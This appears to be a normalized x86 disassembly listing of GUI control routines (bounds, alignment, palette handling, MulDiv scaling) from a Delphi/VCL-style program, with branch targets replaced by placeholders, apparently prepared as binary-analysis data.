je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403540
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_40452c
je r-xdata
mov al 0x1
pop ebx
retn
sub_445eb4
push ebx
mov ebx eax
mov eax ebx
call sub_4535f0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403540
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_445ee8
push ebx
mov ebx eax
mov eax ebx
call sub_424398
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_445f10
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_446fb4
sub_445f30
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_445f50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_404174
sub_445f74
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_446ea4
sub_445f94
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_445fc0
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403540
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403540
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_40452c
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403540
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_446024
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_446900
sub_446044
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4468ec
sub_446064
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_446084
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_423aa8
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_426c68
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_447034
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_445ba4
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_447ef8
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_44615c
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_40375c
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_465920
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403744
push edi
xor ecx ecx
mov edx 0xb039
call sub_448138
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_446924
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_40358c
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_403390
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_403390
mov eax [ edi + 0x68 ]
call sub_403390
mov eax [ edi + 0x64 ]
call sub_408e48
mov edx ebx
and dl 0xfc
mov eax edi
call sub_423af4
test bl bl
jle r-xdata
sub_446228
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_446250
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_40358c
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4462d8
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_4465d8
sub_4462f8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_403390
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_448f54
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_40358c
mov edx ebx
mov eax edi
call sub_423b78
mov eax ebx
mov si 0xffd9
call sub_40358c
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_4463c0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_423f08
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_448138
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_448138
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_448138
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_448138
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_448138
sub_446454
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_423dc4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_446f3c
jmp r-xdata
xor edx edx
mov eax esi
call sub_4462f8
sub_446498
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_40358c
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_4462d8
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_40358c
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_446540
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_4486c8
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_4473cc
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_4465d8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_448138
mov eax ebx
mov si 0xffd0
call sub_40358c
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_40358c
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_4465d8
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_44daa8
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_4466f4
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_446718
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_446740
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_446764
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_446788
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_446883
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_40358c
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44688a
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_41b7f0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_40358c
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_40358c
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_41b4f8
sub_446894
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_4473cc
mov edx edi
mov eax ebx
call sub_446944
mov edx edi
mov eax ebx
call sub_4481dc
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_446900
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_404174
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_446944
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4469a0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_4469cc
mov edx eax
mov ecx esp
mov eax esi
call sub_419ff0
mov edx esp
mov eax ebx
call sub_446e10
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4469e4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_446988
mov ecx esp
mov edx esi
call sub_419ff0
mov edx esp
mov eax ebx
call sub_446e10
pop ecx
pop edx
pop esi
pop ebx
retn
sub_446a0c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_446a8d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446a94
lea eax [ ebp - 0xc ]
call sub_404120
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc80
call sub_403b5c
sub_446a9c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_446ac8
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_446af4
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_461e74
sub_446b24
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_448138
sub_446ba0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_4270c0
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_4270dc
sub_446d6c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_446e02
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_424000
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_446f84
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_40452c
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446e09
lea eax [ ebp - 0x8 ]
call sub_404120
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_446fb4
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_446e10
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_446e58
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
test esi esi
je r-xdata
mov edx ebx
call sub_44a3e4
mov edx ebx
mov eax esi
call sub_44a310
mov eax ebx
call sub_4465d8
sub_446ea4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_40358c
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_448138
mov eax edi
mov si 0xffd0
call sub_40358c
sub_446f3c
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_45ad48
mov edx ebx
mov eax esi
call sub_423b78
sub_446f60
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_448138
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_448138
pop ebx
retn
sub_446f84
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_446ef8
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_404210
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_446f08
sub_446fb4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_447009
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_446f84
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_40452c
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447010
lea eax [ ebp - 0x4 ]
call sub_404120
retn
mov eax esi
call sub_4045e0
mov edx eax
mov eax ebx
call sub_446f60
sub_447034
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_42701c
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_448138
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_42701c
mov [ ebx + 0x84 ] eax
sub_4471bc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4471ac
cmp bl al
